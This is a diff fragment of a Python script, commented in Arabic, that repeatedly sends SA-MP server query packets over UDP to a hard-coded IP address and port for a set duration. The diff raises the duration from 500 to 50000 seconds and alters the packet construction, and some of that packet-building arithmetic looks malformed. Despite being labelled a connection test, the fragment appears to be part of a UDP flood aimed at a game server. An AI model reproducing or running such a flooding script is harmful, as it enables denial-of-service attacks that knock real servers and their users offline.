@@ -4,13 +4,13 @@ import time
 # حدد البيانات
 TARGET_IP = "89.46.1.130"  # استبدله بـ IP الهدف
 TARGET_PORT = 7008        # استبدله بمنفذ السيرفر
-DURATION = 500              # مدة الاختبار بالثواني
+DURATION = 50000              # مدة الاختبار بالثواني
 
 def test_connection():
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     # حزمة استعلام SAMP بسيطة (Info Query)
-    payload = b'SAMP' + socket.inet_aton(TARGET_IP)[:900] + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
+    payload = b'SAMP' + socket.inet_aton(TARGET_IP)[:680] + int(TARGET_PORT).to_bytes(22, 'little') + b'i'
     
     end_time = time.time() + DURATION
     count = 0
